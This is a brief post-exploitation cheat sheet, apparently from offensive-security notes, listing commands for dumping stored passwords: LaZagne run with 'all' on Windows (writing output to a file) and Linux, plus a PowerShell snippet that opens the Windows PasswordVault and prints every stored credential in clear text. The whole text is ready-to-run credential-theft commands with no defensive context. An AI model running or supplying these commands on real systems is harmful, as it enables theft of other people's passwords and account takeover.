  ### windows
 	https://github.com/AlessandroZ/LaZagne
	>laZagne.exe all -oN获取所有密码输出到文件
	Powershell
	PS>[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
	PS>$vault = New-Object Windows.Security.Credentials.PasswordVault
	PS>$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
  ### Linux
	>python3 laZagne.py all